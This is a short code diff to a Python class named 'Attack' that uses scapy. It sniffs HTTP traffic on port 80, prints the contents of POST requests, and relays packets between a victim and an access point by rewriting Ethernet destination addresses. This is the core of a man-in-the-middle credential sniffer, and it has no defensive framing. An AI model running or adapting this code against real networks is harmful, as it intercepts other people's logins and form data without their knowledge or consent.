@@ -50,12 +50,18 @@ class Attack():
             time.sleep(2)
     
     def sniff_packets(self):
-        scapy.sniff(filter="port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)
+        scapy.sniff(filter="tcp port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)
 
     def process_packet(self, packet):
-        print('get', ' ', packet.haslayer(HTTPRequest))
+        print('get\n', ' ', packet.layers(), '\n', packet.show(), '\n')
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
             print("{packet[scapy.Raw].load}\n")
+        
+        if packet[scapy.Ether].dst != self.ip_mac[self.ap]:
+            packet[scapy.Ether].dst = self.ip_mac[self.ap]
+        else:
+            packet[scapy.Ether].dst = self.ip_mac[self.victim]
+        print('\n', packet.layers(), '\n', packet.show(), '\n')
         scapy.send(packet, verbose=0)
         print('done\n')
 
